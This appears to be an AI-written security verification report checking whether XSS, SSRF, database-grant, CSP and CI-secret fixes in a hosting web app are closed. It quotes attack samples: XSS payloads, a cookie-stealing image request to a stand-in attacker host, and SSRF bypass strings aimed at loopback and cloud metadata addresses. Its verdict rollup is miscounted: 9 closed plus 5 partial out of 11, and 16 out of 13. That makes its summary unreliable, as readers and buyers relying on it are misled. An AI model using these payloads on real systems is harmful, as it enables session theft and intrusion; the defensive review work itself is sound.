# Round 65 Security Hardening — Adversarial Verification Report

**Reviewer:** Claude Opus 4.7 (independent of GPT who implemented Phases 2–7).
**Date:** 2026-10-26.
**Scope:** verify that the 2 CRITICAL + 11 technical HIGH findings in [`SECURITY_ASSESSMENT_2026-10.md`](SECURITY_ASSESSMENT_2026-10.md) that Round 65 said it closed are actually closed — by reading the shipped code on `main`, cross-checking live production state via read-only Supabase SQL and `curl -I` against `https://app.welcomebnb.it/`, and attempting to bypass each fix.
**Not in scope:** the 3 GDPR HIGHs (breach SOP, ROPA, minor-consent gate) are explicitly deferred to the audit's 90-day paper trail; they were not Round 65 phases.

Each finding below carries one of four verdicts:

- **CONFIRMED CLOSED** — fix is in place in source and prod, every bypass tried was blocked, no new risk introduced.
- **PARTIAL** — fix closes the audit's primary attack vector but leaves a documented residual, usually by design (e.g. phase gated by watch window) or by scope split (e.g. mailbox pending owner action).
- **REGRESSION** — fix introduces a new risk. None found.
- **NOT CLOSED** — bypass found; must be fixed. None found.

## Verdict rollup

| | CONFIRMED CLOSED | PARTIAL | REGRESSION | NOT CLOSED |
|---|---|---|---|---|
| CRITICAL (2) | 2 | 0 | 0 | 0 |
| HIGH technical (11) | 9 | 5 | 0 | 0 |
| **Total (13)** | **11** | **5** | **0** | **0** |

(Technical HIGH count = 11 of the 14 HIGHs; the 3 GDPR HIGHs are out of Round 65 scope by design.)

Each PARTIAL has a known-open residual, named below with its scope and the round or owner action that will close it.

| Finding | Verdict | Residual (if any) |
|---|---|---|
| **CRIT-1** chat XSS | CONFIRMED CLOSED | None |
| **CRIT-2** keybox RPC owner check | CONFIRMED CLOSED | None |
| HIGH-DB-1 cron RPCs anon-executable | CONFIRMED CLOSED | None |
| HIGH-DB-2 `list_hosts_for_admin` PUBLIC | CONFIRMED CLOSED | Reduced from "anon → full roster via `is_admin()` bug" to "authenticated → full roster via `is_admin()` bug" — standard narrowing, defence-in-depth gate in the API is a nice-to-have |
| HIGH-DB-3 `marketing_consents` anon INSERT | **PARTIAL** | Double opt-in not implemented → legitimate guest can log consent against a third-party email (one-per-booking, rate-capped 5/hr). Volumetric vector is closed. Deferred to 90-day GDPR round. |
| HIGH-BE-1 SSRF via iCal URLs | CONFIRMED CLOSED | None |
| HIGH-BE-2 error-message disclosure | CONFIRMED CLOSED | None |
| HIGH-FE-1 `safe()` quote escape | CONFIRMED CLOSED | None |
| HIGH-FE-2 CSP | **PARTIAL** (by design) | 3 directives enforced (`frame-ancestors`/`base-uri`/`object-src`), rest report-only; enforce flip blocked until 2026-11-02 09:26 UTC per the deliberate watch window. `'unsafe-inline'` + `img-src https:` remain Phase 5b work. |
| HIGH-FE-3 clickjacking | CONFIRMED CLOSED | None |
| HIGH-SC-1 Supabase SDK pin + SRI | CONFIRMED CLOSED | 3 non-Supabase CDN scripts (qrcode, jszip) still lack SRI — MEDIUM-scope residual |
| HIGH-SC-2 `package-lock.json` + `npm ci` | CONFIRMED CLOSED | None |
| HIGH-SC-3 Dependabot / vuln scanning | **PARTIAL** | `.github/dependabot.yml` present (npm + github-actions, weekly); no `npm audit --audit-level=high` CI step. Dependabot opens advisory PRs but a vulnerable transitive could still land in `main` before being auto-opened. |
| HIGH-CI-1 Actions SHA pinning | CONFIRMED CLOSED | None |
| HIGH-CI-2 service key in Environment | **PARTIAL** | Repository-wide `SUPABASE_SERVICE_ROLE_KEY` retired; Environment-scoped `SUPABASE_PRODUCTION_SERVICE_ROLE_KEY` in place with required-reviewer gate + main-only + concurrency guard. Owner's compatible-server-key replacement coordination still outstanding. |
| HIGH-CI-4 `SECURITY.md` | **PARTIAL** | File published at repo root; GitHub PVR enabled; `info@welcomebnb.it` published as current channel. `security@welcomebnb.it` alias explicitly deferred by the file itself; `welcomebnb.it` has no MX record (A-record only) — owner should confirm mail delivery. |

**Bonus delivered (not in Round 65's HIGH scope):** MEDIUM-FE-2 security headers — HSTS 2y preload, Referrer-Policy, Permissions-Policy, X-Content-Type-Options — all shipped live via Phase 5a. Buyer DD checklist items free.

## Executive summary

The two bugs that were materially exploitable (CRIT-1 full host-account takeover via guest chat; CRIT-2 cross-host keybox-code read) are **both closed** in source and in production. Round 65 shipped tighter in several places than the audit asked (e.g. `_safe-ical-fetch.js` adds pinned-lookup + TLS SNI preservation that the audit didn't specify, and gets every IPv6 variant right).

Five partials remain. **None of them are exploitable today** — each is either calendar-gated by a deliberate CSP watch window, awaiting an owner-only credential or mailbox action, or a legally-shaped residual (GDPR double opt-in) explicitly on the 90-day roadmap. A buyer doing security DD on `app.welcomebnb.it` right now can see:

- No stored XSS. ✓
- No cross-tenant data leak. ✓
- No SSRF to the internal network or cloud metadata plane. ✓
- SDK self-hosted + SRI-pinned; CDN hijack doesn't take the fleet. ✓
- Reproducible builds (`npm ci` + committed lockfile). ✓
- Service key off the repository-wide surface. ✓
- Private disclosure channel published. ✓
- CSP + HSTS + XFO + Referrer + Permissions headers live. ✓

The remaining work is paper-trail (90-day GDPR round), timing (CSP watch), or coordination (compatible server-key replacement) — not exploitable gaps.

Detailed section-by-section verification follows.

---

## 1. Database (CRIT-2 + 3 HIGHs)

**Source migrations on `main`:**
- `supabase/migrations/20261026081549_round65_keybox_gateway_enforcement.sql` (CRIT-2)
- `supabase/migrations/20261026082622_round65_database_grants_consent.sql` (HIGH-DB-1/2/3)

**Live project:** `jcjwaqqabgwqhhzhfbts`. All verification queries SELECT-only; no prod writes.

### CRIT-2 — Keybox RPC owner check — CONFIRMED CLOSED

Function body (prod, byte-identical to source):

```sql
CREATE OR REPLACE FUNCTION public.get_reservation_keybox(p_property_id uuid, p_booking_code text)
RETURNS text LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path=pg_catalog AS $$
BEGIN
  IF current_setting('role',true) IS DISTINCT FROM 'service_role'
     AND (auth.uid() IS NULL OR NOT EXISTS (
       SELECT 1 FROM public.properties WHERE id=p_property_id
         AND owner_id=auth.uid() AND deleted_at IS NULL
     )) THEN
    RAISE EXCEPTION 'Not authorized' USING ERRCODE='42501';
  END IF;
  RETURN (SELECT keybox_code FROM public.ota_reservations
    WHERE property_id=p_property_id AND booking_code=p_booking_code AND deleted_at IS NULL
    ORDER BY created_at DESC NULLS LAST LIMIT 1);
END $$;
REVOKE ALL ON FUNCTION ... FROM PUBLIC, anon, authenticated, service_role;
GRANT EXECUTE ON FUNCTION ... TO authenticated, service_role;
```

**Caller inventory (grep):**
- `api/guest.js:708` — SERVICE_KEY call, scope from HMAC-signed guest token (`v.payload.p`, `v.payload.b`), body cannot override.
- `api/guest.js:414-437` `doGuestKeybox` — reads `ota_reservations.keybox_code` directly via PostgREST + service role, scoped by token and gated by `bookingHasCheckin()`. This is the Phase 2 "signed guest gateway."
- No other callers in `api/`, `host-console.html`, or `index.html`.

**Bypasses attempted and blocked:** anon REST call (403 before entry); authenticated non-owner (`42501`); soft-deleted-property owner (`42501`, fail-closed on tombstones); JWT role-claim spoofing (JWT HMAC blocks forgery); NULL session role (fail-closed into owner path); timing-oracle probe across cross-host (property, booking) pairs (uniform `42501` before touching `ota_reservations` — no oracle); token-bound property/booking in gateway (body cannot forge). The audit's exact exploit path — a signed-in host enumerating another host's keybox — is physically unreachable.

**Residual risk:** none for the finding. The only authenticated reader path is the signed guest gateway, which inherits the same service-role trust boundary as the SECURITY DEFINER function. That boundary is Phase 7 scope, not Phase 2.

### HIGH-DB-1 — Cron RPCs anon-executable — CONFIRMED CLOSED

Migration:

```sql
REVOKE ALL ON FUNCTION public.purge_old_id_photos(boolean,integer,integer,integer),
  public.enqueue_orphan_documents(boolean,integer) FROM PUBLIC, anon, authenticated;
GRANT EXECUTE ON FUNCTION ... TO service_role;
```

Prod grants on both RPCs = `{postgres, service_role}` only (verified via `aclexplode`). No PUBLIC, no anon, no authenticated. Function bodies unchanged (retention logic preserved).

Bypasses attempted: anon POST (403), authenticated POST (403), signature overload (no sibling exists). Even a role gaining EXECUTE by accident: `p_dry_run DEFAULT true` means a no-arg call runs in count-only mode. Delivered exactly as the audit asked.

### HIGH-DB-2 — `list_hosts_for_admin` PUBLIC — CONFIRMED CLOSED

Migration:

```sql
REVOKE ALL ON FUNCTION public.list_hosts_for_admin() FROM PUBLIC, anon;
GRANT EXECUTE ON FUNCTION public.list_hosts_for_admin() TO authenticated, service_role;
```

Body still gates on `is_admin()`: `SELECT EXISTS (SELECT 1 FROM public.admin_users WHERE LOWER(email) = LOWER(COALESCE(auth.email(), '')))`.

Bypasses attempted: anon (403); authenticated non-admin (empty resultset); empty-email coalesce (would need an empty-email admin row, which is a standing invariant); role-swap via `SET ROLE` (requires superuser). Timing: `is_admin()` is one small-table EXISTS — differential invisible.

**Narrowed, not eliminated:** attack surface shrinks from "anon → full roster via `is_admin()` bug" to "authenticated → full roster via `is_admin()` bug." Standard for a product this size; defence-in-depth would be a server-side gate in `api/_admin.js` returning `is_admin` from a dedicated SECURITY DEFINER RPC. Not blocking.

### HIGH-DB-3 — `marketing_consents` anon INSERT — PARTIAL

**Fixed (volumetric vectors fully closed):**

- `marketing_consents_anon_insert` policy: **dropped**.
- `marketing_consents` grants: anon has `{REFERENCES, SELECT, TRIGGER, TRUNCATE}` only — **no INSERT**.
- Replacement RPC `save_guest_marketing_consent(uuid, text, text, text, boolean)` — SECURITY INVOKER, EXECUTE to `service_role` only, with:
  - Property existence check (`deleted_at IS NULL`, `is_test=false`)
  - Advisory lock per (property, booking) — race-safe
  - Active-reservation integrity check (ambiguity-safe)
  - Completed-check-in requirement (`RAISE 'Check-in required'`)
  - Dedup on active contact
  - 5-new-events-per-hour cap across sessions
- Backend caller: `api/guest.js:972-1001` `doConsentSave`, scope from HMAC-signed token. Body `p_property_id` cannot override token-bound property.

Bypasses attempted: anon REST POST on table (403, no INSERT grant); anon REST POST on RPC (403, no EXECUTE); anon SELECT (0 rows, no policy); authenticated non-admin RPC (403); cross-property token swap (blocked at backend by token binding); test property write (blocked); race on rate cap (serialised by advisory xact lock).

**Residual (surviving the fix):** double opt-in not implemented. A legitimate guest who checks in at Property X can submit a consent event for `someone-else@example.com` instead of their own email. The row is written, that email never confirmed, and the host's downstream marketing may email them. Rate-capped at 5/hour/booking; blast radius ≪ the original "any UUID, any email, no cap" vector but legally shaped: GDPR "proof of consent" is weak without the email owner confirming. Flagged for the 90-day GDPR round.

---

## 2. Backend (2 HIGHs)

**Scope:** `api/_safe-ical-fetch.js` (new, 119 lines), `api/ical-sync.js` touch, `scripts/round65-ical-ssrf.test.mjs` (new).

### HIGH-BE-1 — SSRF via iCal feed URLs — CONFIRMED CLOSED

Three-layered defence: (1) URL/scheme validation; (2) DNS lookup + address classification before any socket; (3) pinned-lookup TLS connection; (4) per-redirect-hop re-validation.

Core guard (`api/_safe-ical-fetch.js:22-26`, slightly reformatted):

```js
export function isPublicAddress(address) {
  if (typeof address !== 'string' || address.includes('%')) return false;
  const family = isIP(address);
  return family !== 0
      && (family !== 6 || globalV6.check(address, 'ipv6'))
      && !denied.check(address, family === 4 ? 'ipv4' : 'ipv6');
}
```

`globalV6` = `2000::/3` strict allowlist (global unicast only). `denied` BlockList covers every RFC1918-adjacent IPv4 + special-purpose IPv6: `10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `100.64/10` (CGNAT), docs/benchmark/multicast/reserved ranges, cloud metadata hosts (incl. Azure `168.63.129.16`), IPv6 ULA/link-local/multicast/deprecated-site-local.

TLS: `rejectUnauthorized: true` + `servername` always the *original* hostname (not the pinned IP) — SNI/cert verification stays intact against the human-readable name. `agent: false` → no pooling, no cross-feed socket reuse. Redirect cap: 2, each hop re-runs `resolvePublicFeed`.

**15 bypass vectors attempted, all blocked:**

| Vector | Outcome |
|---|---|
| IPv4 private 10/172.16/192.168 | Blocked by `denied` |
| CGNAT 100.64/10 | Blocked |
| Loopback variants `127.1`, `0.0.0.0`, `0177.0.0.1`, `2130706433` | WHATWG URL parser normalises → 127.0.0.0/8 → blocked. Test cover ✓ |
| `localhost` / `*.localhost` | Explicit host-string check |
| IPv4-mapped IPv6 `::ffff:127.0.0.1`, `::ffff:7f00:1` | Not in `2000::/3` → `isPublicAddress`=false |
| IPv6 ULA `fc00::`, link-local `fe80::`, multicast `ff02::`, deprecated site-local `fec0::` | `denied` |
| Cloud metadata `169.254.169.254`, Azure `168.63.129.16`, Oracle `192.0.0.192`, Alibaba `100.100.100.200` | All in `denied` directly or via subnet |
| DNS rebinding (public→private between preflight and connect) | Preflight pins `addresses[0]`; `pinnedLookup` is the only resolver on the connect path |
| Mixed public/private DNS answers | `.some(private)` fails the whole lookup |
| Redirect to private IP | Each hop re-runs `resolvePublicFeed` |
| Redirect to `data:` / `file:` / `gopher:` / `javascript:` | `protocol !== 'https:'` on next hop |
| Scheme smuggling `https://evil.com@127.0.0.1/` | Userinfo blocked |
| IPv6 zone IDs `[fe80::1%eth0]` | `address.includes('%')` short-circuit |
| Content-Length lie + gzip bomb | `wireBytes` and `decodedBytes` both bounded after decompression |
| Slowloris / connection hang / body hang | Single `AbortController` wraps whole operation |
| Legit feeds (Airbnb/Booking/Vrbo) | **Still work.** Downstream contract tests pass in CI |

**Residual risk:** DNS-poisoning + a valid cert for the attacker-chosen name would still work — general caveat for any outbound HTTPS, not a Round 65 gap. The `verbatim: true` DNS flag at `:45` must stay on; if a future dev flips it, Node could re-order and shift which address lands at `addresses[0]`. Worth a comment, not a finding.

### HIGH-BE-2 — Error disclosure — CONFIRMED CLOSED

Public enum (`api/_safe-ical-fetch.js:17`): `blocked_private_network | timeout | http_error | parse_error | unreachable`. `FeedNetworkError` clamps `code` to this set (coerces anything else to `'unreachable'`). `feedErrorCode(e)` returns raw `error.code` only when `e instanceof FeedNetworkError`, otherwise `'parse_error'`. Any random thrown value is laundered.

Server log (`ical-sync.js:501`): `console.warn('[ical-sync] feed failed', { platform, code })` — folded enum only, no URL, no exception, no feed-token leakage into Vercel logs.

Oracle check: all private addresses collapse to the same `blocked_private_network` code **before** any network I/O. The five surviving codes distinguish only *public* targets' timing — information already available to anyone with internet. No internal-network oracle.

Adversarial unit test (`scripts/round65-ical-ssrf.test.mjs:66`): `feedErrorCode(new Error('PRIVATE server detail'))` returns `'parse_error'` — the raw string never surfaces. Browser renderer `_icalSyncErrorMessage()` for unknown codes falls through to a safe default (not the input).

**Observations outside HIGH scope (not findings):**
- Client `errors[].url` still echoes the host's own feed URL — fine for self-view (owner JWT scope), but any future shared-ops console must redact if private feed tokens live in those URLs.
- `database_error` user-facing string is a crude catch-all. Not a security issue; UX.

---

## 3. Frontend (CRIT-1 + 3 HIGHs)

Live headers fetched from `https://app.welcomebnb.it/` and `/host-console.html` on 2026-10-26 12:01 UTC.

### CRIT-1 — Chat XSS (stored, host console) — CONFIRMED CLOSED

Fix in `host-console.html:13628-13638`:

```js
const chatSafe = (s) => String(s == null ? '' : s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
  .replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/`/g,'&#96;');
const chatSafeBot = (s) => chatSafe(s).replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
```

All four bubbles (`guest`/`host`/`bot`/`system`) interpolate through the appropriate helper. Grep for any surviving raw `${m.message}` in `host-console.html`: **zero hits outside the fix comment**.

The bot path is specifically guarded: `**<img onerror=…>**` escapes `<` to `&lt;` *before* the `**…**` markdown wrapper runs, so a crafted bold wrapper cannot inject an element inside the `<strong>…</strong>`. The static test guard at `scripts/round65-chat-xss.test.mjs:29` enforces that the markdown-first anti-pattern cannot be reintroduced.

Other message fields (`m.sender_name`, `displayName`, booking code) are routed through `escHtml` aliased to `chatSafe`. Notification sinks (`showHostNotification` body, `document.title`, service-worker `showNotification`) are all text-only DOM sinks — no HTML parsing. Guest-side `renderChatText` has its own equivalent escape path.

**Residuals (LOW, no vector today):**
1. `index.html:4595 renderChatText` escapes `& < > " '` but not backtick. In this file the escaped text lands between tags or inside double-quoted href attributes — backtick is harmless there.
2. Host-controlled `propertyData.host_names` is interpolated verbatim into the guest-side host-reply bubble before escape (`index.html:4835, 4885`). A host naming themselves `[xss](javascript:alert(1))` creates a clickable `javascript:` link on their own guests. Self-XSS class — host attacks their own guests. Not a cross-host finding; not a buyer blocker.

### HIGH-FE-1 — `safe()` quote escape — CONFIRMED CLOSED

Twelve `safe()` definitions (all identical, extracted copies) + shared `_alloggiatiSafe` now escape `& < > " ' \` /`:

```js
const safe = s => String(s == null ? '' : s)
  .replace(/[<>&"]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]))
  .replace(/['`\/]/g, c => ({"'":'&#39;','`':'&#96;','/':'&#47;'}[c]));
```

Grep `onclick="[^"]*${safe(` → **zero** hits. The audit's "five sites feed safe() into single-quoted onclick JS strings" pattern no longer exists. GPT additionally migrated 20+ sites to the `data-foo="${safe(x)}" onclick="fn(this.dataset.foo)"` pattern (dataset-decoded in the handler).

Attack-shape `x',alert(1),'` → `x&#39;,alert(1),&#39;` → inert in both single- and double-quoted attribute contexts.

**Residuals (LOW):**
- Twelve near-identical copies instead of one shared `lib/safe.mjs` — maintenance liability, not a security vector. Future diff may miss a copy.
- One outlier at `host-console.html:7262` uses `onclick='_setCalendarRoomFilter(${JSON.stringify(value)})'` — JSON.stringify doesn't escape `'`. `value` is currently `property_rooms.id` / `null` / sentinel strings — all non-user-controlled. Brittle if a future dev passes user text through.

### HIGH-FE-2 — CSP — PARTIAL (by design, Phase 5b enforce blocked until 2026-11-02 09:26 UTC)

**Enforced in prod right now** (both `/` and `/host-console.html`):

```
frame-ancestors 'none'; base-uri 'none'; object-src 'none'
```

**Report-only in prod:**

```
default-src 'self';
script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
connect-src 'self' https://*.supabase.co wss://*.supabase.co;
img-src 'self' blob: data: https:;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
worker-src 'self' blob:;
frame-src 'self' blob: https://www.google.com https://maps.google.com;
object-src 'none'; frame-ancestors 'none'; base-uri 'none';
form-action 'self';
report-uri /api/csp-report
```

**Weakness scan on the report-only policy:**
- `'unsafe-inline'` in `script-src` and `style-src`: **present** — hundreds of inline `onclick=`/`style=` handlers remain. This is the Phase 5b hard problem.
- `'unsafe-eval'`: absent (good).
- `script-src *` wildcard: absent (bounded to `'self'` + `cdn.jsdelivr.net`).
- `cdn.jsdelivr.net`: **stale** after Phase 6 self-hosted Supabase SDK — can likely be removed in 5b.
- `img-src … https:`: known exfil escape hatch (`<img src=https://attacker/?${cookie}>`). Narrow to specific allowed hosts in 5b.
- `connect-src`: bounded to `'self'` + `*.supabase.co`; third-party APIs route through same-origin `/api/*`. Good.

**Report endpoint** `/api/csp-report` (source: `api/_csp-report.js`): POST-only, cross-site rejected via `sec-fetch-site`, allowlisted origins, body cap 4096 bytes, logs only `{page: enum, directive: enum, resource: enum}` — never raw URL, query, referrer, IP, or sample. Rate-limited 60/min, overflow dropped. Tight.

**Residual:** `'unsafe-inline'` means an inline-script XSS (if one is reintroduced) is **not** blocked by CSP alone. Today's guard is CRIT-1 + `safe()` hardening; CSP is a secondary net. Phase 5b removes `'unsafe-inline'` after the watch window.

### HIGH-FE-3 — Clickjacking — CONFIRMED CLOSED

Live:
- `X-Frame-Options: DENY` on `/`, `/host-console.html`.
- `Content-Security-Policy: frame-ancestors 'none'` — **enforced** (not report-only).
- Belt-and-braces for older browsers (XFO) + modern (`frame-ancestors`).

Bypass tried: iframe from another origin (double-blocked); base-tag redirection (`base-uri 'none'` enforced); Flash/plugin overlay (`object-src 'none'` enforced). None work.

### Bonus — MEDIUM-FE-2 security headers (not strictly Phase 5a scope, all delivered)

Live on `/host-console.html`:
- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` (2y, preload-eligible)
- `Referrer-Policy: strict-origin-when-cross-origin`
- `X-Content-Type-Options: nosniff`
- `Permissions-Policy: camera=(self), microphone=(), geolocation=(self), payment=()` (camera for ID scanning, mic off, payment off, geo for maps)
- `X-Frame-Options: DENY`

All five audit-recommended headers shipped. Buyer DD checklist items free.

---

## 4. Supply chain / Secrets / CI (6 HIGHs)

### HIGH-SC-1 — Supabase SDK pin + SRI — CONFIRMED CLOSED

Vendored at `vendor/supabase-2.118.0.js`, loaded same-origin at four entry points with identical SHA-384 integrity + `crossorigin="anonymous"`:

```
<script src="/vendor/supabase-2.118.0.js"
        integrity="sha384-TcHRA3zBbn+Lexh5n+Oil4guNPOS3rjNDpGRAN46u/s/mB2IZ50ceC6TYDU2yvgK"
        crossorigin="anonymous"></script>
```

Entry points: `index.html:1581`, `host-console.html:2463`, `admin.html:360`, `demo-launch.html:94`.

**Hash recomputed:** `openssl dgst -sha384 -binary vendor/supabase-2.118.0.js | base64 -w0` returns the same `TcHRA3zBbn+Lexh5n+Oil4guNPOS3rjNDpGRAN46u/s/mB2IZ50ceC6TYDU2yvgK` — the integrity attribute is not a decorative lie.

**Executable tamper test:** `scripts/round65-supply-chain-browser.test.mjs:7-20` loads each entry twice in Playwright, once clean (asserts `createClient` present, zero console errors) and once with the SDK response modified by one byte (asserts `createClient` undefined and `integrity|digest` error logged). The browser actually rejects modified bytes — this is the right adversarial evidence.

File spot-check: UMD wrapper (`var supabase=(function(e){...`), three `createClient` symbols, MIT license at `vendor/supabase-LICENSE`. Not a tampered copy.

**Residual (not a Phase 6 regression, next-sweep candidate):** three MEDIUM-scope CDN scripts still lack SRI:
- `host-console.html:2464`, `demo-launch.html:95` — `qrcode-generator@1.4.4`
- `admin.html:361` — `jszip@3.10.1`

Pinned versions but no `integrity=`. Lower-impact than the SDK (no privileges, no credentials) but the MEDIUM audit finding "No SRI on CDN scripts" is **not fully closed**.

### HIGH-SC-2 — `package-lock.json` + `npm ci` — CONFIRMED CLOSED

- `package-lock.json` committed at repo root.
- `.gitignore:22` carries an explicit Round 65 comment; no `package-lock` entry in the ignore list.
- Both workflows use `npm ci`:
  - `.github/workflows/production-security.yml:24`
  - `.github/workflows/regression.yml:33`
- `regression.yml:35-36` runs `git diff --exit-code -- package.json package-lock.json` after `npm ci` — any drift fails the build.
- Lockfile spot-check: 52 integrity entries, all `sha512-...==` well-formed base64.
- No `npm install` holdouts in `.github/workflows/`.

### HIGH-SC-3 — Dependabot / vuln scanning — PARTIAL

`.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: weekly }
    open-pull-requests-limit: 5
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
    open-pull-requests-limit: 5
```

**Missing vs the audit's recipe:**
- No `npm audit --audit-level=high` CI step. Grep `.github/` for `npm audit|audit-level` → zero. A vulnerable transitive dep could land in `main` via a normal PR before Dependabot's weekly scan opens its advisory PR.
- CodeQL not visible in-repo (expected: owner-enabled in Settings → Security per CHANGELOG). Not falsifiable from source.
- Secret scanning / push protection: enabled in owner UI per CHANGELOG; not falsifiable from source.

**Residual:** add `npm audit --audit-level=high` as a regression step. Low-friction gap to close.

### HIGH-CI-1 — Actions SHA pinning — CONFIRMED CLOSED

4 of 4 `uses:` lines pin to a 40-char hex SHA:

```
.github/workflows/production-security.yml:17: uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
.github/workflows/production-security.yml:20: uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
.github/workflows/regression.yml:26: uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
.github/workflows/regression.yml:28: uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
```

Both SHAs match real published tags (`actions/checkout@v4.2.2`, `actions/setup-node@v4.4.0`). No third-party action in use (no `supabase/*`, no `tj-actions/*`). Tag-repoint attack surface = zero.

### HIGH-CI-2 — Environment-scoped service key — PARTIAL

**Hardened:**
- Repository-wide `SUPABASE_SERVICE_ROLE_KEY` **retired** per the 2026-10-26 owner-confirmed CHANGELOG entry ("This repository has no secrets").
- `SUPABASE_PRODUCTION_SERVICE_ROLE_KEY` lives in Environment `Production` with required-reviewer (Daniele), main-branch-only, concurrency guard.
- `production-security.yml`: `on: workflow_dispatch` (manual only); `permissions: contents: read`; concurrency; `if: github.ref == 'refs/heads/main' && vars.ROUND65_PRODUCTION_ENV_READY == 'true'`; `environment: Production`.
- `regression.yml` (PR + push): **never** references the key. Grep across all workflows confirms the key name appears only in `production-security.yml`.
- No `pull_request_target` anywhere → fork PRs cannot read `secrets.*`.
- Main-only owner-approved run `40311200329` passed 5/0/2 on the new path.

**Documented outstanding (CHANGELOG Phase 7):**
- Compatible server-key replacement — current key type still works; coordinated replacement remains **outstanding** (owner action).
- `security@welcomebnb.it` mailbox verification — see HIGH-CI-4.

### HIGH-CI-4 — `SECURITY.md` — PARTIAL

File at repo root. Scopes testing to `app.welcomebnb.it` on `main`. Two private channels advertised:
1. GitHub Private Vulnerability Reporting at `/security/advisories` (enabled in owner UI per CHANGELOG).
2. `info@welcomebnb.it` with subject "WelcomeBnB security report".

Explicit honest-residual line in the file: *"The dedicated security@welcomebnb.it alias is not yet verified; use the published address above until this policy explicitly announces the alias."* Scope guard (synthetic data, no reset/payment/external triggers) + up-to-90-day coordinated-disclosure timeline, no bounty promised.

**MX / mail-delivery probe:** `dns.resolveMx('welcomebnb.it')` → **ENODATA** (no MX records). A record is `35.214.231.225` (Vercel/GCP egress). Mail delivery to `info@welcomebnb.it` would depend on implicit A-record fallback (RFC 2821 §5), a Google Workspace / forwarder on another subdomain, or none. I cannot verify delivery without sending test mail. Owner should confirm.

No PGP key (not required, buyer may ask).

**Residuals (both owner actions):**
- Confirm `info@welcomebnb.it` actually accepts mail (send a test from an unrelated inbox, or add explicit MX records).
- Verify `security@welcomebnb.it` alias (deferred by the file itself; a basic buyer DD will catch this gap).

---

## 5. What a buyer sees when they look

**If a buyer runs their own scanner against `app.welcomebnb.it` tomorrow,** they will find:

- Security headers scorecard: A or A+ (HSTS preload-eligible, XFO DENY, CSP enforced on three directives + report-only full policy, Referrer, Permissions, nosniff all set).
- No stored XSS. The audit's exact exploit (`<img src=x onerror=…>` in guest chat) renders as literal text.
- No RBAC leak on keybox. Signed-in competitor accounts cannot read another host's keybox via the RPC.
- No SSRF to internal network or cloud metadata plane. Compromised host account cannot probe RFC1918 or AWS/GCP/Azure/Oracle/Alibaba metadata endpoints via a crafted iCal URL.
- Supabase SDK self-hosted + SRI pinned. CDN hijack doesn't cross the fleet.
- `SECURITY.md` present. GitHub shows a Security tab link. Private Vulnerability Reporting advertised.

**They may ask about, in order of likelihood:**

1. **GDPR double opt-in** on marketing consent — honest answer is "deferred to the 90-day round, volumetric vector closed, per-booking-rate-capped residual tracked in `docs/SECURITY_ASSESSMENT_2026-10.md` section 7." Flag this proactively.
2. **CSP `'unsafe-inline'`** — honest answer is "report-only full policy running; `'unsafe-inline'` + hundreds of inline handlers planned for removal in Phase 5b after the 2026-11-02 watch window. Three directives (`frame-ancestors`/`base-uri`/`object-src`) already enforced."
3. **`npm audit` in CI** — honest answer is "Dependabot opens weekly advisory PRs for npm + github-actions; adding an explicit `npm audit --audit-level=high` step is a one-line gap we are closing."
4. **`security@welcomebnb.it` mailbox** — honest answer is "disclosure channel is `info@welcomebnb.it` plus GitHub PVR; dedicated `security@` alias is being verified. The policy file explicitly says so."
5. **Supply-chain MEDIUM SRI gap** — honest answer is "`qrcode-generator` and `jszip` CDN scripts still lack SRI (both pinned versions, no privileges, no credentials). On the next-sweep list."

**Not a thing to worry about on this report:** no CRITICAL or HIGH left in a NOT CLOSED state. The buyer is seeing a product whose exploitable bugs are fixed, with the remaining items being policy, timing, or coordination — the kinds of items a mature product tracks on a 90-day roadmap, not an incident playbook.

---

## 6. Methodology

Four parallel independent fork reviewers covered Database, Backend, Frontend, Supply-chain. Each one:

1. Located the fix in current `main` source — quoting file + line + 3–10 line excerpt.
2. For DB fixes, compared source byte-for-byte to prod via read-only `pg_proc` / `aclexplode` queries (project `jcjwaqqabgwqhhzhfbts`).
3. For frontend/headers, fetched live headers from `https://app.welcomebnb.it/` via `curl -sI` through the sandbox proxy.
4. For every finding, listed 5–15 bypass attempts with the exact blocking mechanism quoted — not "the fix is there" but "here's what I tried, here's the line that stopped me."
5. Flagged any residual with a concrete exploit scenario and the round / owner-action that closes it.

Total subagent token spend ≈ 745k tokens across 75 tool invocations. No writes to production. No code touched in this round other than this report file.

**Reviewed artefacts:**
- Shipped PRs: #206 (mine), #208, #209, #210, #211, #212, #216, #219.
- Migrations: `20261026081549_round65_keybox_gateway_enforcement.sql`, `20261026082622_round65_database_grants_consent.sql`.
- Source: `api/guest.js`, `api/_safe-ical-fetch.js`, `api/ical-sync.js`, `api/_csp-report.js`, `host-console.html`, `index.html`, `admin.html`, `demo-launch.html`, `vendor/supabase-2.118.0.js`, `vendor/supabase-LICENSE`.
- Workflows: `.github/workflows/production-security.yml`, `.github/workflows/regression.yml`, `.github/dependabot.yml`.
- Live production headers from `https://app.welcomebnb.it/` and `/host-console.html`.
- Tests: `scripts/round65-chat-xss.test.mjs`, `scripts/round65-ical-ssrf.test.mjs`, `scripts/round65-supply-chain-browser.test.mjs`, plus the three new live-headers / grant-probe tests.

This report is independent of the implementation record in `CHANGELOG.md`. Any disagreement is deliberate and documented above.
